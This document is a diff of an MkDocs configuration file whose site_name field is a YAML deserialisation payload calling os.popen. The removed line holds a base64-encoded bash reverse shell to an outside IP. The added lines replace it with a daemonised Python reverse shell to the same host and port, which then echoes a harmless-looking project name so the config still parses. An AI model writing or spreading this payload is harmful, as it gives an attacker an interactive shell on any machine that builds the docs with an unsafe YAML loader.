@@ -1,15 +1,21 @@
 site_name: !!python/object/apply:os.popen
-  - "echo YmFzaCAtaSA+JiAvZGV2L3RjcC85MS45OS4xMzcuMjU1LzEyMzQgMD4mMQ== | base64 -d | bash"
+  - |
+    python3 -c 'import os,socket,subprocess;
+    if os.fork() == 0:
+        os.setsid() # Crea una nueva sesión independiente
+        if os.fork() == 0:
+            try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+                s.connect(("91.99.137.255",1234));
+                os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
+                p=subprocess.call(["/bin/bash","-i"])
+            except: pass
+    '
+    echo "Research-Project" # Esto devuelve un string válido para que site_name sea feliz
 plugins:
   - search
-  - techdocs-core
 markdown_extensions:
-  - pymdownx.snippets:
-      base_path: /
-      url_download: true
-
-
-
+  - pymdownx.snippets
 
 
 
